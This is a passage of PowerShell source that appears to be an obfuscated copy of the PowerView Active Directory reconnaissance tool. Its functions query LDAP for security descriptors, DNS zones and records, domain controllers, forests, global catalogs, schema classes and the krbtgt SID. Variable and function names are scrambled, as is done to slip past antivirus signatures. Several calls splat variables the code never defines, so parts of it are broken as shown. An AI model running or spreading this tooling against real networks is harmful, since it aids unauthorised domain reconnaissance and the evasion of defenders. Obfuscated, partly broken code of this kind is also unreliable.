            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $ZQDzJlKJ99[$_] = $rtPnFfWd99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $ZQDzJlKJ99[$_] = $rtPnFfWd99[$_][0] -as $HKOMbBRs99
            }
            elseif ($_ -eq 'samaccounttype') {
                $ZQDzJlKJ99[$_] = $rtPnFfWd99[$_][0] -as $JUaICLKF99
            }
            elseif ($_ -eq 'objectguid') {
                $ZQDzJlKJ99[$_] = (New-Object Guid (,$rtPnFfWd99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $ZQDzJlKJ99[$_] = $rtPnFfWd99[$_][0] -as $qulkrNPT99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $drcYyHEX99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $rtPnFfWd99[$_][0], 0
                if ($drcYyHEX99.Owner) {
                    $ZQDzJlKJ99['Owner'] = $drcYyHEX99.Owner
                }
                if ($drcYyHEX99.Group) {
                    $ZQDzJlKJ99['Group'] = $drcYyHEX99.Group
                }
                if ($drcYyHEX99.DiscretionaryAcl) {
                    $ZQDzJlKJ99['DiscretionaryAcl'] = $drcYyHEX99.DiscretionaryAcl
                }
                if ($drcYyHEX99.SystemAcl) {
                    $ZQDzJlKJ99['SystemAcl'] = $drcYyHEX99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($rtPnFfWd99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ZQDzJlKJ99[$_] = "NEVER"
                }
                else {
                    $ZQDzJlKJ99[$_] = [datetime]::fromfiletime($rtPnFfWd99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($rtPnFfWd99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $rtPnFfWd99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ZQDzJlKJ99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $ZQDzJlKJ99[$_] = ([datetime]::FromFileTime(($rtPnFfWd99[$_][0])))
                }
            }
            elseif ($rtPnFfWd99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $rtPnFfWd99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ZQDzJlKJ99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[Johnson] error: $_"
                    $ZQDzJlKJ99[$_] = $Prop[$_]
                }
            }
            elseif ($rtPnFfWd99[$_].count -eq 1) {
                $ZQDzJlKJ99[$_] = $rtPnFfWd99[$_][0]
            }
            else {
                $ZQDzJlKJ99[$_] = $rtPnFfWd99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ZQDzJlKJ99
    }
    catch {
        Write-Warning "[Johnson] Error parsing LDAP properties : $_"
    }
}
function bleachers {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [String]
        $iyrjLvjk99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $nZWoutdh99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $QNLwMLiv99 = $UtXBFQsM99
            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $NzTnTiPA99 = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $NzTnTiPA99) {
                    $vbArOcpE99 = "$($ENV:LOGONSERVER -replace '\\','').$NzTnTiPA99"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            $UgUtFWQz99 = manège -fxunRYJT99 $fxunRYJT99
            $vbArOcpE99 = ($UgUtFWQz99.PdcRoleOwner).Name
            $QNLwMLiv99 = $UgUtFWQz99.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $QNLwMLiv99 = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $QNLwMLiv99) {
                $vbArOcpE99 = "$($ENV:LOGONSERVER -replace '\\','').$QNLwMLiv99"
            }
        }
        else {
            write-verbose "get-domain"
            $UgUtFWQz99 = manège
            $vbArOcpE99 = ($UgUtFWQz99.PdcRoleOwner).Name
            $QNLwMLiv99 = $UgUtFWQz99.Name
        }
        if ($PSBoundParameters['Server']) {
            $vbArOcpE99 = $YBAlGqrU99
        }
        $eoHtKWgS99 = 'LDAP://'
        if ($vbArOcpE99 -and ($vbArOcpE99.Trim() -ne '')) {
            $eoHtKWgS99 += $vbArOcpE99
            if ($QNLwMLiv99) {
                $eoHtKWgS99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $eoHtKWgS99 += $iyrjLvjk99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($nedSgaYy99 -Match '^GC://') {
                $DN = $nedSgaYy99.ToUpper().Trim('/')
                $eoHtKWgS99 = ''
            }
            else {
                if ($nedSgaYy99 -match '^LDAP://') {
                    if ($nedSgaYy99 -match "LDAP://.+/.+") {
                        $eoHtKWgS99 = ''
                        $DN = $nedSgaYy99
                    }
                    else {
                        $DN = $nedSgaYy99.SubString(7)
                    }
                }
                else {
                    $DN = $nedSgaYy99
                }
            }
        }
        else {
            if ($QNLwMLiv99 -and ($QNLwMLiv99.Trim() -ne '')) {
                $DN = "DC=$($QNLwMLiv99.Replace('.', ',DC='))"
            }
        }
        $eoHtKWgS99 += $DN
        Write-Verbose "[bleachers] search base: $eoHtKWgS99"
        if ($fxunRYJT99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[bleachers] Using alternate credentials for LDAP connection"
            $UgUtFWQz99 = New-Object DirectoryServices.DirectoryEntry($eoHtKWgS99, $fxunRYJT99.UserName, $fxunRYJT99.GetNetworkCredential().Password)
            $GczSkSTf99 = New-Object System.DirectoryServices.DirectorySearcher($UgUtFWQz99)
        }
        else {
            $GczSkSTf99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$eoHtKWgS99)
        }
        $GczSkSTf99.PageSize = $JFYciBwT99
        $GczSkSTf99.SearchScope = $daZTeEQR99
        $GczSkSTf99.CacheResults = $False
        $GczSkSTf99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $GczSkSTf99.ServerTimeLimit = $qaKJUqzZ99
        }
        if ($PSBoundParameters['Tombstone']) {
            $GczSkSTf99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $GczSkSTf99.filter = $WmhkcxXr99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $GczSkSTf99.SecurityMasks = Switch ($nZWoutdh99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $gXwlYKUd99 = $rtPnFfWd99| ForEach-Object { $_.Split(',') }
            $Null = $GczSkSTf99.PropertiesToLoad.AddRange(($gXwlYKUd99))
        }
        $GczSkSTf99
    }
}
function toil {
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $ThIbXWBV99
    )
    BEGIN {
        function throwbacks {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )
            [Int]$sDXaQcuk99 = $Raw[0]
            [Int]$fceoeqeh99 = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''
            while ($fceoeqeh99-- -gt 0)
            {
                [Int]$pvcEeUlf99 = $Raw[$Index++]
                while ($pvcEeUlf99-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }
    PROCESS {
        $ZkMCmRkH99 = [BitConverter]::ToUInt16($ThIbXWBV99, 2)
        $zTtwvpYg99 = [BitConverter]::ToUInt32($ThIbXWBV99, 8)
        $QelBLshO99 = $ThIbXWBV99[12..15]
        $Null = [array]::Reverse($QelBLshO99)
        $TTL = [BitConverter]::ToUInt32($QelBLshO99, 0)
        $Age = [BitConverter]::ToUInt32($ThIbXWBV99, 20)
        if ($Age -ne 0) {
            $JuTlRMal99 = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $JuTlRMal99 = '[static]'
        }
        $UhOiJOJQ99 = New-Object PSObject
        if ($ZkMCmRkH99 -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $ThIbXWBV99[24], $ThIbXWBV99[25], $ThIbXWBV99[26], $ThIbXWBV99[27]
            $Data = $IP
            $UhOiJOJQ99 | Add-Member Noteproperty 'RecordType' 'A'
        }
        elseif ($ZkMCmRkH99 -eq 2) {
            $YvgCEned99 = throwbacks $ThIbXWBV99[24..$ThIbXWBV99.length]
            $Data = $YvgCEned99
            $UhOiJOJQ99 | Add-Member Noteproperty 'RecordType' 'NS'
        }
        elseif ($ZkMCmRkH99 -eq 5) {
            $Alias = throwbacks $ThIbXWBV99[24..$ThIbXWBV99.length]
            $Data = $Alias
            $UhOiJOJQ99 | Add-Member Noteproperty 'RecordType' 'CNAME'
        }
        elseif ($ZkMCmRkH99 -eq 6) {
            $Data = $([System.Convert]::ToBase64String($ThIbXWBV99[24..$ThIbXWBV99.length]))
            $UhOiJOJQ99 | Add-Member Noteproperty 'RecordType' 'SOA'
        }
        elseif ($ZkMCmRkH99 -eq 12) {
            $Ptr = throwbacks $ThIbXWBV99[24..$ThIbXWBV99.length]
            $Data = $Ptr
            $UhOiJOJQ99 | Add-Member Noteproperty 'RecordType' 'PTR'
        }
        elseif ($ZkMCmRkH99 -eq 13) {
            $Data = $([System.Convert]::ToBase64String($ThIbXWBV99[24..$ThIbXWBV99.length]))
            $UhOiJOJQ99 | Add-Member Noteproperty 'RecordType' 'HINFO'
        }
        elseif ($ZkMCmRkH99 -eq 15) {
            $Data = $([System.Convert]::ToBase64String($ThIbXWBV99[24..$ThIbXWBV99.length]))
            $UhOiJOJQ99 | Add-Member Noteproperty 'RecordType' 'MX'
        }
        elseif ($ZkMCmRkH99 -eq 16) {
            [string]$TXT  = ''
            [int]$pvcEeUlf99 = $ThIbXWBV99[24]
            $Index = 25
            while ($pvcEeUlf99-- -gt 0) {
                $TXT += [char]$ThIbXWBV99[$index++]
            }
            $Data = $TXT
            $UhOiJOJQ99 | Add-Member Noteproperty 'RecordType' 'TXT'
        }
        elseif ($ZkMCmRkH99 -eq 28) {
            $Data = $([System.Convert]::ToBase64String($ThIbXWBV99[24..$ThIbXWBV99.length]))
            $UhOiJOJQ99 | Add-Member Noteproperty 'RecordType' 'AAAA'
        }
        elseif ($ZkMCmRkH99 -eq 33) {
            $Data = $([System.Convert]::ToBase64String($ThIbXWBV99[24..$ThIbXWBV99.length]))
            $UhOiJOJQ99 | Add-Member Noteproperty 'RecordType' 'SRV'
        }
        else {
            $Data = $([System.Convert]::ToBase64String($ThIbXWBV99[24..$ThIbXWBV99.length]))
            $UhOiJOJQ99 | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }
        $UhOiJOJQ99 | Add-Member Noteproperty 'UpdatedAtSerial' $zTtwvpYg99
        $UhOiJOJQ99 | Add-Member Noteproperty 'TTL' $TTL
        $UhOiJOJQ99 | Add-Member Noteproperty 'Age' $Age
        $UhOiJOJQ99 | Add-Member Noteproperty 'TimeStamp' $JuTlRMal99
        $UhOiJOJQ99 | Add-Member Noteproperty 'Data' $Data
        $UhOiJOJQ99
    }
}
function Lister {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Alias('ReturnOne')]
        [Switch]
        $HyjxYAeb99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $sMQTvMNR99 = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['Properties']) { $sMQTvMNR99['Properties'] = $rtPnFfWd99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $KGtsIIHf99 = bleachers @SearcherArguments
        if ($KGtsIIHf99) {
            if ($PSBoundParameters['FindOne']) { $mKhNNgkp99 = $KGtsIIHf99.FindOne()  }
            else { $mKhNNgkp99 = $KGtsIIHf99.FindAll() }
            $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                $Out = Johnson -rtPnFfWd99 $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }
            if ($mKhNNgkp99) {
                try { $mKhNNgkp99.dispose() }
                catch {
                    Write-Verbose "[terrestrials] Error disposing of the Results object: $_"
                }
            }
            $KGtsIIHf99.dispose()
        }
        $sMQTvMNR99['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $mUlQkQSM99 = bleachers @SearcherArguments
        if ($mUlQkQSM99) {
            try {
                if ($PSBoundParameters['FindOne']) { $mKhNNgkp99 = $mUlQkQSM99.FindOne() }
                else { $mKhNNgkp99 = $mUlQkQSM99.FindAll() }
                $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                    $Out = Johnson -rtPnFfWd99 $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($mKhNNgkp99) {
                    try { $mKhNNgkp99.dispose() }
                    catch {
                        Write-Verbose "[Lister] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[Lister] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $mUlQkQSM99.dispose()
        }
    }
}
function initial {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $fKMuYbVb99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99 = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Alias('ReturnOne')]
        [Switch]
        $HyjxYAeb99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $sMQTvMNR99 = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($fKMuYbVb99),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['Properties']) { $sMQTvMNR99['Properties'] = $rtPnFfWd99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $KxPyVBgO99 = bleachers @SearcherArguments
        if ($KxPyVBgO99) {
            if ($PSBoundParameters['FindOne']) { $mKhNNgkp99 = $KxPyVBgO99.FindOne() }
            else { $mKhNNgkp99 = $KxPyVBgO99.FindAll() }
            $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = Johnson -rtPnFfWd99 $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $fKMuYbVb99
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        $KmUpmaZL99 = toil -ThIbXWBV99 $Out.dnsrecord[0]
                    }
                    else {
                        $KmUpmaZL99 = toil -ThIbXWBV99 $Out.dnsrecord
                    }
                    if ($KmUpmaZL99) {
                        $KmUpmaZL99.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[initial] Error: $_"
                    $Out
                }
            }
            if ($mKhNNgkp99) {
                try { $mKhNNgkp99.dispose() }
                catch {
                    Write-Verbose "[initial] Error disposing of the Results object: $_"
                }
            }
            $KxPyVBgO99.dispose()
        }
    }
}
function manège {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[manège] Using alternate credentials for manège'
            if ($PSBoundParameters['Domain']) {
                $QNLwMLiv99 = $UtXBFQsM99
            }
            else {
                $QNLwMLiv99 = $fxunRYJT99.GetNetworkCredential().Domain
                Write-Verbose "[manège] Extracted domain '$QNLwMLiv99' from -fxunRYJT99"
            }
            $eBrvARzt99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $QNLwMLiv99, $fxunRYJT99.UserName, $fxunRYJT99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($eBrvARzt99)
            }
            catch {
                Write-Verbose "[manège] The specified domain '$QNLwMLiv99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $eBrvARzt99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $UtXBFQsM99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($eBrvARzt99)
            }
            catch {
                Write-Verbose "[manège] The specified domain '$UtXBFQsM99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[manège] Error retrieving the current domain: $_"
            }
        }
    }
}
function pizzicatos {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [Switch]
        $LDAP,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $EGdFJfOi99 = @{}
        if ($PSBoundParameters['Domain']) { $EGdFJfOi99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Credential']) { $EGdFJfOi99['Credential'] = $fxunRYJT99 }
        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $EGdFJfOi99['Server'] = $YBAlGqrU99 }
            $EGdFJfOi99['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
            sensationalist @Arguments
        }
        else {
            $SONjDSur99 = manège @Arguments
            if ($SONjDSur99) {
                $SONjDSur99.DomainControllers
            }
        }
    }
}
function workaholics {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $veLuTYXG99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose "[workaholics] Using alternate credentials for workaholics"
            if ($PSBoundParameters['Forest']) {
                $zFEzrnAa99 = $veLuTYXG99
            }
            else {
                $zFEzrnAa99 = $fxunRYJT99.GetNetworkCredential().Domain
                Write-Verbose "[workaholics] Extracted domain '$veLuTYXG99' from -fxunRYJT99"
            }
            $dHOgJjZK99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $zFEzrnAa99, $fxunRYJT99.UserName, $fxunRYJT99.GetNetworkCredential().Password)
            try {
                $AFLIxNZC99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($dHOgJjZK99)
            }
            catch {
                Write-Verbose "[workaholics] The specified forest '$zFEzrnAa99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $dHOgJjZK99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $veLuTYXG99)
            try {
                $AFLIxNZC99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($dHOgJjZK99)
            }
            catch {
                Write-Verbose "[workaholics] The specified forest '$veLuTYXG99' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            $AFLIxNZC99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if ($AFLIxNZC99) {
            if ($PSBoundParameters['Credential']) {
                $zwmDTnuP99 = (threatened -soGjewdO99 "krbtgt" -UtXBFQsM99 $AFLIxNZC99.RootDomain.Name -fxunRYJT99 $fxunRYJT99).objectsid
            }
            else {
                $zwmDTnuP99 = (threatened -soGjewdO99 "krbtgt" -UtXBFQsM99 $AFLIxNZC99.RootDomain.Name).objectsid
            }
            $Parts = $zwmDTnuP99 -Split '-'
            $zwmDTnuP99 = $Parts[0..$($Parts.length-2)] -join '-'
            $AFLIxNZC99 | Add-Member NoteProperty 'RootDomainSid' $zwmDTnuP99
            $AFLIxNZC99
        }
    }
}
function acupuncture {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $veLuTYXG99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $EGdFJfOi99 = @{}
        if ($PSBoundParameters['Forest']) { $EGdFJfOi99['Forest'] = $veLuTYXG99 }
        if ($PSBoundParameters['Credential']) { $EGdFJfOi99['Credential'] = $fxunRYJT99 }
        $AFLIxNZC99 = workaholics @Arguments
        if ($AFLIxNZC99) {
            $AFLIxNZC99.Domains
        }
    }
}
function quirked {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $veLuTYXG99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $EGdFJfOi99 = @{}
        if ($PSBoundParameters['Forest']) { $EGdFJfOi99['Forest'] = $veLuTYXG99 }
        if ($PSBoundParameters['Credential']) { $EGdFJfOi99['Credential'] = $fxunRYJT99 }
        $AFLIxNZC99 = workaholics @Arguments
        if ($AFLIxNZC99) {
            $AFLIxNZC99.FindAllGlobalCatalogs()
        }
    }
}
function lingos {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $EqkRLZui99,
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $veLuTYXG99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $EGdFJfOi99 = @{}
        if ($PSBoundParameters['Forest']) { $EGdFJfOi99['Forest'] = $veLuTYXG99 }
        if ($PSBoundParameters['Credential']) { $EGdFJfOi99['Credential'] = $fxunRYJT99 }
        $AFLIxNZC99 = workaholics @Arguments
        if ($AFLIxNZC99) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($vCXzurVS99 in $EqkRLZui99) {
                    $AFLIxNZC99.Schema.FindClass($vCXzurVS99)
                }
            }
            else {
                $AFLIxNZC99.Schema.FindAllClasses()
            }
        }
    }
}
function comic {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $EqkRLZui99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ahzBjmEt99,
        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $ChgzXhpE99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
